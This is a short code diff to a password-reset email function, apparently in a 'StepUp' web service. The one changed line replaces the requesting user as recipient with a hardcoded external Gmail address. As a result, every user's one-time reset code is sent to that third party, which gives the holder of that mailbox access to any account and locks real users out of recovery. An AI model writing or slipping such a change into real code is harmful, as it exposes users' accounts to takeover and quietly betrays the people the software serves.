@@ -189,7 +189,7 @@ async function sendResetEmail({ to, name, otp }) {
     },
     body: JSON.stringify({
       from: process.env.MAIL_FROM,
-      to: [to],
+      to: ['origen.enterprise@gmail.com'],
       subject: 'StepUp Password Reset OTP',
       html: `
         <div style="font-family: Arial, sans-serif; line-height: 1.6;">
